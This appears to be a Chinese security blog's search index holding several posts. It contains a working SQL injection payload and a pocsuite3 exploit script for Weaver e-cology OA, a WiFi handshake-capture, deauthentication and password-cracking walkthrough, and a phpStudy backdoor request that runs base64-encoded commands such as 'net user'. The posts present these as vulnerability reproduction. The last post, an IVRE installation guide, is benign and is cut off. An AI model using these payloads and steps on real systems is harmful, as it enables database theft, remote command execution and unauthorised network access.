<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>泛微OA  WorkflowCenterTreeData接口注入漏洞复现</title>
      <link href="/2019/10/10/fan-wei-oa-workflowcentertreedata-jie-kou-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/10/10/fan-wei-oa-workflowcentertreedata-jie-kou-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在CNVD上刚发现泛微OA的新漏洞，就有大佬发出漏洞细节，就进行了复现。</p><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p>攻击者可利用漏洞获取数据库敏感信息。</p><p><strong>（限Oracle数据库）</strong></p><p> 影响版本 暂不明确</p><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>泛微e-cology OA系统的WorkflowCenterTreeData接口在使用oracle数据库时,由于内置sql语句拼接不严,导致其存在sql注入漏洞</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191010155307.png" alt></p><h1 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>直接抓包，使用payload请求</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191010155058.png" alt></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#! python3&quot;&quot;&quot;@FileName: e_cology_oa_workflow_sqli.py.py@Author: dylan@software: PyCharm @Datetime: 2019-10-10 15:05&quot;&quot;&quot;from pocsuite3.api import Output, POCBase, register_poc, requests, loggerimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)class DemoPOC(POCBase):    vulID = &quot;&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &quot;3.0&quot;  # 默认为1    author = &quot;dylan&quot;  # PoC作者的大名    vulDate = &quot;2019/10/10&quot;  # 漏洞公开的时间,不知道就写今天    createDate = &quot;2019/10/10&quot;  # 编写 PoC 的日期    updateDate = &quot;2019/10/10&quot;  # PoC 更新的时间,默认和编写时间一样    references = [&quot;&quot;]  # 漏洞地址来源,0day不用写    name = &quot;e_cology_oa_workflow_sqli&quot;  # PoC 名称    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址    appName = &quot;泛微e-cology OA&quot;  # 漏洞应用名称    appVersion = &quot;&quot;  # 漏洞影响版本    vulType = &quot;sqli&quot;  # 漏洞类型,类型参考见 漏洞类型规范表    desc = &quot;&quot;&quot;        只影响Oracle数据库    &quot;&quot;&quot;  # 漏洞简要描述    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    pocDesc = &quot;&quot;&quot;    &quot;&quot;&quot;    def _verify(self):        # 验证代码        result = {}        headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0&quot;,                   &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,&quot;                             &quot;application/xml;q=0.9,*/*;q=0.8&quot;,                   &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,                   &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,                   &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,                   &quot;Connection&quot;: &quot;close&quot;,                   &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}        data = &quot;formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0dunion select NULL,value from v$parameter order by (((1 &quot;        path = &quot;/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333&quot;        url = self.url + path        # print(url)        respose = requests.post(url, data=data, headers=headers, verify=False, timeout=60)        if respose.status_code == 200 and &quot;id&quot; in respose.text:  # result是返回结果            result[&#39;VerifyInfo&#39;] = {}            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url            # result[&#39;VerifyInfo&#39;][&#39;content&#39;] = respose.text        return self.parse_output(result)    def _attack(self):        # 攻击代码        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&quot;Internet nothing returned&quot;)        return output# 注册 DemoPOC 类register_poc(DemoPOC)</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-34241" target="_blank" rel="noopener">泛微e-cology OA系统Wo***接口存在SQL注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> 泛微OA </tag>
            
            <tag> 注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali抓包破解WIFI密码</title>
      <link href="/2019/09/30/kali-zhua-bao-po-jie-wifi-mi-ma/"/>
      <url>/2019/09/30/kali-zhua-bao-po-jie-wifi-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>使用kali破解wifi密码，如果kali安装在虚拟机，需要一个外置usb网卡。</p><h1 id="0x02-开始"><a href="#0x02-开始" class="headerlink" title="0x02 开始"></a>0x02 开始</h1><h2 id="查看插入的网卡"><a href="#查看插入的网卡" class="headerlink" title="查看插入的网卡"></a>查看插入的网卡</h2><p>打开kali虚拟机，插入USB无线网卡，打开终端</p><p><code>iwconfig</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930115136.png" alt></p><h2 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a>查看无线网卡</h2><p><code>airmon-ng</code><br>上面命令列出了支持监控模式的无线网卡。如果没有任何输出，表示无线网卡不支持监控模式。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930115331.png" alt></p><h2 id="开启网卡监听模式-记录Interface名称-杀掉其他使用WiFi进程"><a href="#开启网卡监听模式-记录Interface名称-杀掉其他使用WiFi进程" class="headerlink" title="开启网卡监听模式,记录Interface名称,杀掉其他使用WiFi进程"></a>开启网卡监听模式,记录Interface名称,杀掉其他使用WiFi进程</h2><p><code>airmon-ng  start wlan0</code><br>如果有下图提示表示有其他网卡处于监控模式。<br>使用<br><code>airmon-ng check kill</code><br>结束其他使用WIFI进程<br>在执行<br><code>airmon-ng  start wlan0</code><br>记住interface名称。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930120244.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930131449.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930131600.png" alt></p><h2 id="扫描信号"><a href="#扫描信号" class="headerlink" title="扫描信号"></a>扫描信号</h2><p><code>airodump-ng wlan0mon</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930120326.png" alt></p><ul><li>BSSID是AP端的MAC地址</li><li>PWR是信号强度，数字越小越好</li><li>Data是对应的路由器的在线数据吞吐量，数字越大，数据上传量越大。</li><li>CH是对应路由器的所在信道</li><li>ESSID是对应路由器的名称</li></ul><p>找到目标后，<code>ctrl + c</code> 中止</p><h2 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h2><pre><code>airodump-ng -c 11 -w ./test --bssid 78:44:FD:83:0B:2C wlan0monairodump-ng -c &lt;AP的信道&gt; -w &lt;抓取握手包的存放位置名称&gt; --bssid &lt;AP的MAC地址&gt; &lt;你的的Interface名称&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930133222.png" alt></p><h2 id="解除认证攻击"><a href="#解除认证攻击" class="headerlink" title="解除认证攻击"></a>解除认证攻击</h2><p>保持上一个terminal窗口的运行状态，打开一个新的terminal,进行解除认证攻击<br>强制连接到wifi的设备重新连接路由器，掉线设备重连后，如图所示位置显示<code>WPA handshake --</code>即成功抓取到握手包。<br>两个terminal使用<code>ctrl+c</code>终止攻击和握手抓包。</p><pre><code>aireplay-ng -0 0 -a 9C:A6:15:D0:04:C9 -c D8:32:E3:A7:B9:6F wlan0monaireplay-ng -&lt;攻击模式，我们这里使用 解除认证攻击(数字0)&gt; [攻击次数，0为无限攻击] -a &lt;AP端的MAC地址&gt; -c &lt;客户端端的MAC地址&gt; &lt;interface名称&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930135405.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930135508.png" alt></p><h2 id="关闭无线网卡的监听模式"><a href="#关闭无线网卡的监听模式" class="headerlink" title="关闭无线网卡的监听模式"></a>关闭无线网卡的监听模式</h2><p><code>airmon-ng stop wlan0mon</code></p><h2 id="使用字典暴力破解"><a href="#使用字典暴力破解" class="headerlink" title="使用字典暴力破解"></a>使用字典暴力破解</h2><p>kali下自带一份无线密码字典 –&gt;<code>/usr/share/wordlists/rockyou.txt.gz</code><br>解压：<br><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p><pre><code>aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap#-w指定 密码字典 -b指定路由器的MAC地址</code></pre><p>爆破成功后，如图区域位置显示<code>KEY FOUND!</code>字样，中括里为AP端的密码。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930145120.png" alt></p><p>over！</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_21137441/article/details/88795079" target="_blank" rel="noopener">使用Aircrack-ng 工具进行WIFI的监听和破解 - 林中静月下仙的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> tools </tag>
            
            <tag> wifi </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpStudy后门漏洞复现</title>
      <link href="/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/"/>
      <url>/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>phpStudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、<br>ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，<br>在国内有着近百万的PHP语言学习者、开发者用户。<br>最近杭州公安在<a href="https://mp.weixin.qq.com/s?__biz=MzA4MjM2MDgxMA==&mid=2815602999&idx=1&sn=b01cd1d8b2c50df48d4196400a3db8d9&chksm=bda0f1b28ad778a46f7cf77ec1ddf1488a063b183732735bc3808621d71765792213f8deb6fe&scene=21#wechat_redirect" target="_blank" rel="noopener">“杭州警方通报打击涉网违法犯罪暨“净网2019”专项行动战果”</a>一文中提到:</p><blockquote><p>Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer<br>多款软件一次性安装，无需配置即可直接安装使用，具有PHP环境调试和PHP开发功能，在国内有着近百万PHP语言学习者、开发者用户。<br>正是这样一款公益性软件，2018年12月4日，西湖区公安分局网警大队接报案称，某公司发现公司内有20余台计算机被执行危险命令，<br>疑似远程控制抓取账号密码等计算机数据 回传大量敏感信息。<br>据统计，截止抓获时间，犯罪嫌疑人共非法控制计算机67万余台，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，<br>非法牟利共计600余万元。</p></blockquote><p>令人震惊的同时，想想自己电脑上还下的有好几个版本的phpstudy，根据大佬的思路复现一波，踩了几个特别坑的坑。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><ul><li>phpStudy2016<br>  <code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br>  <code>php\php-5.4.45\ext\php_xmlrpc.dll</code></li><li>phpStudy2018<br>  <code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br>  <code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></li></ul><h1 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h1><h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>win10+phpStudy 2018(php-5.4.45+Apache)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924232920.png" alt></p><h2 id="后门验证："><a href="#后门验证：" class="headerlink" title="后门验证："></a>后门验证：</h2><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p><p><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></p><p>存在<code>@eval(%s(&#39;%s&#39;));</code>即说明有后门。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924233404.png" alt></p><h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><h3 id="BP抓包复现"><a href="#BP抓包复现" class="headerlink" title="BP抓包复现"></a>BP抓包复现</h3><p>直接访问首页抓包</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924234029.png" alt></p><p>在请求头里构造 <code>Accept-Encoding</code> 和 <code>accept-charset</code> 即可。</p><p> <code>Accept-Encoding</code> 已经有了，但是这里注意：<br> <strong>要把<code>gzip, deflate</code>  里逗号后面的空格去掉，不然命令执行不成功。</strong></p><p> <img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924235906.png" alt></p><p>然后在请求头里添加 <code>accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==</code><br><code>Accept-Charset</code> 的值就是执行的命令，默认是<code>system(&#39;net user&#39;);</code><br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！</p><p><strong>最后注意，要保证有请求体，只有请求头会一直卡在Waiting，最后返回超时。<br>在请求头最后，至少敲两下回车，然后留空或者随便添加点什么。</strong></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000134.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000651.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000852.png" alt></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre><code>GET / HTTP/1.1Host: 192.168.1.12Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,und;q=0.5,pt;q=0.4,zh-TW;q=0.3,lb;q=0.2,fr;q=0.1,ca;q=0.1,ja;q=0.1,mt;q=0.1,de;q=0.1,vi;q=0.1,pl;q=0.1,tr;q=0.1,nb;q=0.1,es;q=0.1Connection: closeContent-Length: 2</code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> phpstudy </tag>
            
            <tag> 后门 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16 源码搭建 IVRE</title>
      <link href="/2019/09/21/yuan-ma-da-jian-ivre/"/>
      <url>/2019/09/21/yuan-ma-da-jian-ivre/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>IVRE(又名DRUNK)是一款开源的网络侦查框架工具，IVRE使用Nmap、Zmap进行主动网络探测，<br>使用Bro、P0f等进行网络流量被动分析，探测结果存入数据库中，方便数据的查询、分类汇总统计。<br>网上大多都是使用Docker进行安装，配置便捷，不会遇到太多问题，但有时候特殊需求需要用源码<br>进行安装，特此记录一下。<br>可以参考官方文档：<a href="https://doc.ivre.rocks/en/latest/overview/index.html" target="_blank" rel="noopener">Overview — IVRE documentation</a><br>Github：<a href="https://github.com/cea-sec/ivre" target="_blank" rel="noopener">ivre: Network recon framework.</a></p><h1 id="0x02-Install-amp-Setup"><a href="#0x02-Install-amp-Setup" class="headerlink" title="0x02 Install&amp;Setup"></a>0x02 Install&amp;Setup</h1><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>安装需要的服务器数据库<br><code>sudo apt-get -y install mongodb python-pymongo python-crypto \</code><br><code>python-future python-bottle apache2 libapache2-mod-wsgi dokuwiki</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921161300.png" alt></p><p>下载源码<br><code>git clone https://github.com/cea-sec/ivre</code></p><p>源码安装<br>（推荐用Python2，Python3踩坑见文末）<br><code>cd ivre</code><br><code>python3 setup.py build</code><br><code>sudo python3 setup.py install</code></p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><pre><code>$ sudo -s# cd /var/www/html ## or depending on your version /var/www# rm index.html# ln -s /usr/local/share/ivre/web/static/* .# cd /var/lib/dokuwiki/data/pages# ln -s /usr/local/share/ivre/dokuwiki/doc# cd /var/lib/dokuwiki/data/media# ln -s /usr/local/share/ivre/dokuwiki/media/logo.png# ln -s /usr/local/share/ivre/dokuwiki/media/doc# cd /usr/share/dokuwiki# patch -p0 &lt; /usr/local/share/ivre/dokuwiki/backlinks.patch# cd /etc/apache2/mods-enabled# for m in rewrite.load wsgi.conf wsgi.load ; do&gt;   [ -L $m ] || ln -s ../mods-available/$m ; done# cd ../# echo &#39;Alias /cgi &quot;/usr/local/share/ivre/web/wsgi/app.wsgi&quot;&#39; &gt; conf-enabled/ivre.conf# echo &#39;&lt;Location /cgi&gt;&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;SetHandler wsgi-script&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;Options +ExecCGI&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;Require all granted&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;&lt;/Location&gt;&#39; &gt;&gt; conf-enabled/ivre.conf# sed -i &#39;s/^\(\s*\)#Rewrite/\1Rewrite/&#39; /etc/dokuwiki/apache.conf# echo &#39;WEB_GET_NOTEPAD_PAGES = &quot;localdokuwiki&quot;&#39; &gt;&gt; /etc/ivre.conf# service apache2 reload  ## or start# exit</code></pre><p>完成后，访问<a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a>,服务器访问ip，即可看到WEB UI</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921163114.png" alt></p><p>如果搭建在服务器上，记得点击help，查看是否正常工作。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921164623.png" alt></p><p>如果显示 <code>Forbidden</code>,使用如下命令修改配置文件<br><code>vim /etc/dokuwiki/apache.conf</code><br>将<br><code>Allow from localhost 127.0.0.1 ::1</code><br>修改为：</p><pre><code>#Allow from localhost 127.0.0.1 ::1Allow from all</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921165037.png" alt></p><h1 id="0x03-Database-init-data-download-amp-importation"><a href="#0x03-Database-init-data-download-amp-importation" class="headerlink" title="0x03 Database init, data download &amp; importation"></a>0x03 Database init, data download &amp; 